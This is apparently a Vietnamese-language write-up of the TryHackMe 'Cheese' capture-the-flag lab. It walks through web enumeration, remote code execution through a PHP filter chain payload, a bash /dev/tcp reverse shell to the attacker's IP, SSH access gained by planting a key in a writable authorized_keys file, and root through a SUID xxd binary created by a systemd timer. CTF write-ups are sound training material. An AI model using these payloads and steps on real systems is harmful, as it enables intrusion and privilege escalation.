---
title: THM - Chesse CTF
date: 02-03-2025
category: ctf
tags:
  - php
  - rce
  - lfi
  - portspoof
---

# Enumeration
## Scan
- O lab nay, tat ca cac port deu dc mo
- Ky thuat mo tat ca cac cong duoc goi la portspoof
## Dirsearch
```bash
┌──(t6d㉿t6d)-[~/Documents/pentest-script]
└─$ dirsearch -u http://chesse.thm/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/t6d/Documents/pentest-script/reports/http_chesse.thm/__25-03-02_11-27-26.txt

Target: http://chesse.thm/

[11:27:26] Starting: 
[11:27:39] 403 -  275B  - /.htaccess.save
[11:27:39] 403 -  275B  - /.ht_wsr.txt
[11:27:39] 403 -  275B  - /.htaccess.sample
[11:27:39] 403 -  275B  - /.htaccess_sc
[11:27:39] 403 -  275B  - /.htaccess_orig
[11:27:39] 403 -  275B  - /.htaccess.bak1
[11:27:39] 403 -  275B  - /.htaccess.orig
[11:27:39] 403 -  275B  - /.htaccess_extra
[11:27:39] 403 -  275B  - /.htaccessOLD
[11:27:39] 403 -  275B  - /.html
[11:27:39] 403 -  275B  - /.htpasswds
[11:27:39] 403 -  275B  - /.htpasswd_test
[11:27:39] 403 -  275B  - /.htm
[11:27:39] 403 -  275B  - /.httr-oauth
[11:27:39] 403 -  275B  - /.htaccessBAK
[11:27:39] 403 -  275B  - /.htaccessOLD2
[11:27:43] 403 -  275B  - /.php
[11:28:49] 301 -  309B  - /images  ->  http://chesse.thm/images/
[11:28:49] 200 -  482B  - /images/
[11:28:57] 200 -  370B  - /login.php
[11:29:07] 200 -  254B  - /orders.html
[11:29:21] 403 -  275B  - /server-status
[11:29:21] 403 -  275B  - /server-status/
[11:29:36] 200 -  254B  - /users.html
```
## Vhost/Subdomain
```bash
```

# Brute Force /login.php
![[Pasted image 20250302120449.png]]
- Gia su co account admin, ta thu brute force
```bash

```
## Ngoai le
- Ta co the tim thay them 1 url la `/messages.html`
# Exploit
Để exploit được lab này, ta cần học về [[PHP Filter Chain]].
Su dung synacktiv tool de tao payload
```bash
──(t6d㉿t6d)-[~/Documents/pentest-script]
└─$ python3 php_filter_chain_generator.py --chain '<?php phpinfo() ?>'
[+] The following gadget chain will generate the following code : <?php phpinfo() ?> (base64 value: PD9waHAgcGhwaW5mbygpID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
Thu no ta co ket qua:
![[Pasted image 20250303113622.png]]
Den luc voc vach roi :))
Ta su dung reverse shell:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"10.8.16.212"/1234 0>&1'");?>
```
Mo cong bang netcat:
```bash
nc -nlvp 1234
```
Ta da truy cap duoc vao host: 
```bash
www-data@cheesectf:/var/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@cheesectf:/var/www$ cat /etc/passwd | grep /home
cat /etc/passwd | grep /home
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
comte:x:1000:1000:comte:/home/comte:/bin/bash
```
Ta tim dc user `comte`, thu tim trong `/home/comte`:
```bash
www-data@cheesectf:/var/www$ cd /home/comte
cd /home/comte
www-data@cheesectf:/home/comte$ ls -la
ls -la
total 52
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 .
drwxr-xr-x 3 root  root  4096 Sep 27  2023 ..
-rw------- 1 comte comte   55 Apr  4  2024 .Xauthority
lrwxrwxrwx 1 comte comte    9 Apr  4  2024 .bash_history -> /dev/null
-rw-r--r-- 1 comte comte  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 comte comte 3771 Feb 25  2020 .bashrc
drwx------ 2 comte comte 4096 Sep 27  2023 .cache
drwx------ 3 comte comte 4096 Mar 25  2024 .gnupg
drwxrwxr-x 3 comte comte 4096 Mar 25  2024 .local
-rw-r--r-- 1 comte comte  807 Feb 25  2020 .profile
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .ssh
-rw-r--r-- 1 comte comte    0 Sep 27  2023 .sudo_as_admin_successful
drwx------ 3 comte comte 4096 Mar 25  2024 snap
-rw------- 1 comte comte 4276 Sep 15  2023 user.txt
```
Nhu da thay thi ko the `cat` duoc `user.txt`, nhung voi `.ssh` thi co. Ta them public key dc tao ra tren may attacker bang `ssh-keygen` va add no vao `authorized_keys`:
```bash
www-data@cheesectf:/home/comte/.ssh$ ls -la
ls -la
total 12
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 ..
-rw-rw-rw- 1 comte comte   89 Mar  3 11:32 authorized_keys
```

```bash
echo '[public key]' >> authorized_keys
```
Gio chi viec ssh vao thoi:
```bash
└─$ ssh comte@cheese.thm                           
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 03 Mar 2025 11:33:08 AM UTC

  System load:  0.0                Processes:             143
  Usage of /:   31.1% of 18.53GB   Users logged in:       0
  Memory usage: 8%                 IPv4 address for ens5: 10.10.67.7
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

47 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
comte@cheesectf:~$ 
```
Ta thu enum privilege escalaton:
```bash
comte@cheesectf:~$ id
uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
comte@cheesectf:~$ uname -a
Linux cheesectf 5.4.0-174-generic #193-Ubuntu SMP Thu Mar 7 14:29:28 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```
Ta thay rang ta co quyen cho `exploit.timer`, ta tim xem no la gi va dang o dau:
```bash
comte@cheesectf:~$ find / -iname exploit.timer
...
/etc/systemd/system/exploit.timer
...
```
Ta tim hieu xem no la gi:
```bash
comte@cheesectf:~$ ls -la /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 root root 87 Mar 29  2024 /etc/systemd/system/exploit.timer
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```
Sau khi tim hieu no la `systemd Timers`, no se chay service sau mot khoang thoi gian duoc them o muc `OnBootSec=`, truoc tien thi ta xem thu service co gi, no o ngay trong `/etc/systemd/system/`: 
```bash
comte@cheesectf:/etc/systemd/system$ ls -la
total 128
drwxr-xr-x 21 root root 4096 Apr  4  2024 .
drwxr-xr-x  5 root root 4096 Mar 14  2023 ..
drwxr-xr-x  2 root root 4096 Mar 14  2023 cloud-final.service.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 cloud-init.target.wants
lrwxrwxrwx  1 root root   40 Mar 14  2023 dbus-org.freedesktop.ModemManager1.service -> /lib/systemd/system/ModemManager.service
lrwxrwxrwx  1 root root   44 Mar 14  2023 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
lrwxrwxrwx  1 root root   36 Sep 27  2023 dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
lrwxrwxrwx  1 root root   45 Mar 14  2023 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 default.target.wants
drwxr-xr-x  2 root root 4096 Sep 27  2023 emergency.target.wants
-rw-r--r--  1 root root  141 Mar 29  2024 exploit.service
-rwxrwxrwx  1 root root   87 Mar 29  2024 exploit.timer
drwxr-xr-x  2 root root 4096 Mar 14  2023 final.target.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 getty.target.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 graphical.target.wants
lrwxrwxrwx  1 root root   38 Mar 14  2023 iscsi.service -> /lib/systemd/system/open-iscsi.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 mdmonitor.service.wants
lrwxrwxrwx  1 root root   38 Mar 14  2023 multipath-tools.service -> /lib/systemd/system/multipathd.service
drwxr-xr-x  2 root root 4096 Apr  4  2024 multi-user.target.wants
lrwxrwxrwx  1 root root   35 Sep 27  2023 mysqld.service -> /lib/systemd/system/mariadb.service
lrwxrwxrwx  1 root root   35 Sep 27  2023 mysql.service -> /lib/systemd/system/mariadb.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 network-online.target.wants
drwxr-xr-x  2 root root 4096 Mar 14  2023 open-vm-tools.service.requires
drwxr-xr-x  2 root root 4096 Mar 14  2023 paths.target.wants
drwxr-xr-x  2 root root 4096 Sep 27  2023 rescue.target.wants
drwxr-xr-x  2 root root 4096 Sep 27  2023 sleep.target.wants
-rw-r--r--  1 root root  349 Sep 28  2023 snap-core20-2015.mount
-rw-r--r--  1 root root  349 Mar 14  2024 snap-core20-2182.mount
drwxr-xr-x  2 root root 4096 Mar 16  2024 snapd.mounts.target.wants
-rw-r--r--  1 root root  343 Mar 14  2023 snap-lxd-24061.mount
-rw-r--r--  1 root root  467 Mar 14  2023 snap.lxd.activate.service
-rw-r--r--  1 root root  541 Mar 14  2023 snap.lxd.daemon.service
-rw-r--r--  1 root root  330 Mar 14  2023 snap.lxd.daemon.unix.socket
-rw-r--r--  1 root root  349 Sep 27  2023 snap-snapd-20092.mount
-rw-r--r--  1 root root  349 Mar 16  2024 snap-snapd-21184.mount
drwxr-xr-x  2 root root 4096 Sep 27  2023 sockets.target.wants
drwxr-xr-x  2 root root 4096 Sep 27  2023 sshd-keygen@.service.d
lrwxrwxrwx  1 root root   31 Sep 27  2023 sshd.service -> /lib/systemd/system/ssh.service
drwxr-xr-x  2 root root 4096 Mar 14  2023 sysinit.target.wants
lrwxrwxrwx  1 root root   35 Mar 14  2023 syslog.service -> /lib/systemd/system/rsyslog.service
drwxr-xr-x  2 root root 4096 Mar 29  2024 timers.target.wants
-rw-r--r--  1 root root  156 Sep 27  2023 twist.service
lrwxrwxrwx  1 root root   41 Mar 14  2023 vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
comte@cheesectf:/etc/systemd/system$ cat exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```
`ExecStart` se duoc thuc thi khi service duoc chay. `/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd` la lenh gan `setgid` cho phep thuc thi file duoi quyen cua owner. Vi du nhu o day ta, tuc `comte` co the thuc thi `/opt/xxd` duoi quyen `root`. Oke noi du nhieu roi, gio ta khoi dong service:
```bash
comte@cheesectf:/etc/systemd/system$ sudo /bin/systemctl daemon-reload

comte@cheesectf:/etc/systemd/system$ sudo /bin/systemctl start exploit.timer
```
Ta da co quyen SUID, ta se dung [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/#suid) de tim cach su dung no:
![[Pasted image 20250303190719.png]]
```bash
/opt/xxd "/root/root.txt" | xxd -r
```